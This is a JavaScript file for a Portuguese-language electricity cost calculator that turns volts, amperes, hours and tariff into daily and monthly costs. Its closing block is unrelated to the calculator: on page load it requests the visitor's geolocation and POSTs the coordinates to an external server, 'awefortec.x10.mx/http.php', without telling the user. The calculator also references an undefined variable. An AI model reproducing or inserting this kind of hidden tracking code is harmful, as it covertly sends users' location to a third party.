/*
--Regras--

1: P = Volts x Amperes
2: t = horas
3: wh = Potência x Tempo
4: kwh = wh/1000
5: custo = Tarifa x Kwh 
*/

//Chamar form

const formulario = document.getElementById("form");

formulario.addEventListener("submit", function (event) {
    event.preventDefault(); // Impede o envio padrão do formulário

    //Pegar valores 

    var volts = document.getElementById('volts').value,
        amperes = document.getElementById('amperes').value,
        tempo = document.getElementById('tempo').value,
        tarifa = document.getElementById('tarifa').value,
        aparelho = document.getElementById('aparelho').value,
        result = document.getElementById('result');


    //verficar se a "," aou inves de "."
    //transforma em numero

    if (volts.split(',')) volts = parseFloat(volts.replaceAll(',', '.'));
    else volts = parseFloat(volts);

    if (amperes.split(',')) amperes = parseFloat(amperes.replaceAll(',', '.'));
    else amperes = parseFloat(amperes);

    if (tempo.split(',')) tempo = parseFloat(tempo.replaceAll(',', '.'));
    else tempo = parseFloat(tempo);

    if (tarifa.split(',')) tarifa = parseFloat(tarifa.replaceAll(',', '.'));
    else tarifa = parseFloat(tarifa);

    //Sistema de calculos
    //Primeiro passo

    var potencia = volts * amperes;

    //Segundo passo

    var wh = potencia * tempo;

    //Terceiro passo 

    var kwh = wh / 1000

    //Quarto passo

    var custo = tarifa * kwh;

    //custo ao mês

    var custo_mes = custo * 30;

    //Trocar a "." por de ","
    //transforma em numero

    volts = volts.toFixed(2).toString();
    if (volts.split('.')) volts = volts.replaceAll('.', ',');

    amperes = amperes.toFixed(2).toString();
    if (amperes.split('.')) amperes = amperes.replaceAll('.', ',');

    tempo = tempo.toFixed(2).toString();
    if (tempo.split('.')) tempo = tempo.replaceAll('.', ',');

    tarifa = tarifa.toFixed(2).toString();
    if (tarifa.split('.')) tarifa = tarifa.replaceAll('.', ',');

    custo = custo.toFixed(2).toString();
    if (custo.split('.')) custo = custo.replaceAll('.', ',');

    custo_mes = custo_mes.toFixed(2).toString();
    if (custo_mes.split('.')) custo_mes = custo_mes.replaceAll('.', ',');

    wh = wh.toFixed(2).toString();
    if (wh.split('.')) wh = wh.replaceAll('.', ',');

    kwh = kwh.toFixed(2).toString();
    if (kwh.split('.')) kwh = kwh.replaceAll('.', ',');

    potencia = potencia.toFixed(2).toString();
    if (potencia.split('.')) potencia = potencia.replaceAll('.', ',');


    //elementos da pagina 

    const h3 = document.createElement('h3');
    h3.textContent = 'Aparelho: ' + aparelho;

    const spanPFormula = document.createElement("span");
    spanPFormula.textContent = "P = " + volts + " x " + amperes;

    const spanP = document.createElement("span");
    spanP.textContent = "P = " + potencia;

    const spanWhFormula = document.createElement("span");
    spanWhFormula.textContent = "wh = " + potencia + " x " + tempo;

    const spanWh = document.createElement("span");
    spanWh.textContent = "wh = " + wh;

    const spanKwhFormula = document.createElement("span");
    spanKwhFormula.textContent = "kwh = " + wh + "/1000";

    const spanKwh = document.createElement("span");
    spanKwh.textContent = "kwh = " + kwh;

    const spanCustoFormula = document.createElement("span");
    spanCustoFormula.textContent = "Custo = " + tarifa + " x " + kwh;

    const spanCusto = document.createElement("b");
    spanCusto.textContent = "Custo ao dia = R$ " + custo;

    const spanCustoMesFormula = document.createElement("span");
    spanCustoMesFormula.textContent = "Custo ao mês = " + custo + " x 30";

    const spanCustoMes = document.createElement("b");
    spanCustoMes.textContent = "Custo ao mês = R$ " + custo_mes;

    result.innerHTML = '';
    result.appendChild(h3);
    result.appendChild(spanPFormula);
    result.appendChild(spanP);
    result.appendChild(document.createElement("br"));
    result.appendChild(spanWhFormula);
    result.appendChild(spanWh);
    result.appendChild(document.createElement("br"));
    result.appendChild(spanKwhFormula);
    result.appendChild(spanKwh);
    result.appendChild(document.createElement("br"));
    result.appendChild(spanCustoFormula);
    result.appendChild(spanCusto);
    result.appendChild(document.createElement("br"));
    result.appendChild(spanCustoMesFormula);
    result.appendChild(spanCustoMes);
    result.appendChild(document.createElement("br"));
    result.appendChild(spanComputadorGasta);
});

//obter localização do usuario

if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(function (position) {

        //localização

        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        // Crie um objeto com os dados de localização em formato JSON.
        const locationData = {
            latitude: latitude,
            longitude: longitude
        };

        // Converta o objeto em uma string JSON.
        const jsonData = JSON.stringify(locationData);

        // URL do servidor externo onde você deseja enviar os dados.
        const serverURL = 'https://awefortec.x10.mx/http.php';

        // Configuração da solicitação POST.
        const requestOptions = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json' // Especifica que o corpo da solicitação é JSON.
            },
            body: jsonData // O corpo da solicitação contém os dados de localização em formato JSON.
        };

        // Faça a solicitação POST para o servidor externo.
        fetch(serverURL, requestOptions)
            .then(response => {
                if (response.ok) {
                    // A solicitação foi bem-sucedida.
                    console.log('Dados de localização enviados com sucesso.');
                } else {
                    // A solicitação falhou. Você pode tratar os erros aqui.
                    console.error('Erro ao enviar dados de localização:', response.statusText);
                }
            })
            .catch(error => {
                console.error('Erro na solicitação:', error);
            });
        // Você pode usar essas coordenadas para obter informações mais detalhadas de localização usando APIs de terceiros, como o Google Maps Geocoding API.
    }, function (error) {
        console.error("Erro ao obter a localização: " + error.message);
    });
} else {
    console.error("Geolocalização não está disponível no seu navegador.");
}